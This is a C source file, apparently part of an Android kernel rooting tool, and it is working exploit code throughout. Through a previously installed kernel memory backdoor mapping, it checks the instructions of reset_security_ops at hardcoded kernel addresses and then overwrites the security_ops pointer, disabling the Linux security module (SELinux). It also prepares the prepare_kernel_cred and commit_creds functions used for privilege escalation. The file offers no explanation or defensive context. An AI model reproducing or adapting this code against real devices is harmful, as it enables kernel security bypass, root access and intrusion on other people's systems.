#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "backdoor_mmap.h"

#define reset_security_ops    0xc027ec94
#define default_security_ops  0xc0fa6804
#define security_ops          0xc1150630

static unsigned long int check_reset_security_ops[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  default_security_ops,
  security_ops
};

static int n_check_reset_security_ops = (sizeof (check_reset_security_ops)
                                        / sizeof (check_reset_security_ops[0]));

static bool
run_unlock(void)
{
  unsigned long int *p = backdoor_convert_to_mmaped_address((void *)reset_security_ops);

  if (memcmp(p, check_reset_security_ops, sizeof check_reset_security_ops) != 0) {
    int i;

    printf("reset_security_ops doesn't match!!\n");
    for (i = 0; i < n_check_reset_security_ops; i++) {
      printf("  0x%04x\n", p[i]);
    }

    return false;
  }

  *(unsigned long int *)security_ops = default_security_ops;
  return true;
}

static bool
run_exploit(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool ret;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = run_unlock();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!setup_creds_functions()) {
    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  if (!run_exploit()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
